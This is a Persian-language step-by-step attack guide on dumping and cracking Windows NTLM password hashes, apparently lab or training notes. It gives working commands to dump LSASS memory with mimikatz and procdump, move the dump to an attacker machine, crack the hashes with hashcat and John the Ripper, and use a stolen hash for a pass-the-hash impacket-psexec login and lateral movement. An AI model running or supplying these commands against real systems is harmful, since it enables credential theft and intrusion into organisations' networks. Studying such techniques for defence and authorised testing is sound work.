

---

# 🛠 سناریوی Dumping & Cracking NTLM Hashes

## 🎯 هدف

به‌دست آوردن **NTLM Hash** کاربران ویندوز از سیستم قربانی و سپس کرک کردن آن برای دسترسی به رمز عبور.

---

## 🔹 مرحله 1: دسترسی اولیه (Initial Access)

- مهاجم قبلاً روی سیستم قربانی یک دسترسی (Reverse Shell, C2, یا RDP) دارد.
    
- برای ادامه نیاز است که **Privilege Escalation** انجام شود تا به سطح **SYSTEM** برسیم (چون LSASS فقط با دسترسی بالا قابل خواندن است).
    

---

## 🔹 مرحله 2: استخراج حافظه (Dumping LSASS)

**روش ۱: با Mimikatz مستقیم روی ماشین قربانی**

```powershell
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

- این دستور لاگین‌های فعال و هش‌های NTLM ذخیره‌شده در حافظه LSASS را می‌دهد.
    

**روش ۲: با Procdump مایکروسافت + Mimikatz**

```powershell
procdump.exe -ma lsass.exe lsass.dmp
```

- فایل `lsass.dmp` ساخته می‌شود.
    
- سپس روی ماشین مهاجم:
    

```powershell
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

**روش ۳: ابزارهای دیگر (Impacket, CrackMapExec, Rubeus)**  
بسته به شرایط می‌توان از ابزارهای ریموت هم استفاده کرد.

---

## 🔹 مرحله 3: استخراج هش‌ها

از دستور `sekurlsa::logonpasswords` هش‌ها به دست می‌آیند، معمولاً به شکل:

```
Username : Administrator
Domain   : LAB
NTLM     : aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
```

---

## 🔹 مرحله 4: انتقال هش به ماشین مهاجم

- هش‌ها یا فایل دامپ را به سیستم مهاجم منتقل می‌کنیم (با scp, smbclient, nc یا هر روش دیگر).
    

---

## 🔹 مرحله 5: کرک کردن هش (Cracking NTLM Hashes)

ابزارهای معروف:

- **Hashcat**
    
- **John the Ripper**
    

### با Hashcat:

```bash
hashcat -m 1000 hash.txt wordlist.txt
```

(`-m 1000` برای NTLM است)

### با John:

```bash
john --format=NT hash.txt --wordlist=rockyou.txt
```

---

## 🔹 مرحله 6: استفاده از هش یا پسورد

- اگر پسورد پیدا شود → لاگین مستقیم.
    
- اگر فقط هش باشد → حمله **Pass-the-Hash**:
    

```bash
impacket-psexec LAB/Administrator@10.0.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
```

---

# ✅ جمع‌بندی

1. دسترسی اولیه و ارتقا به SYSTEM.
    
2. Dump گرفتن از LSASS (مستقیم یا غیرمستقیم).
    
3. استخراج هش NTLM.
    
4. انتقال به ماشین مهاجم.
    
5. کرک هش با ابزار.
    
6. استفاده از پسورد یا Pass-the-Hash برای حرکت جانبی (Lateral Movement).
    

---

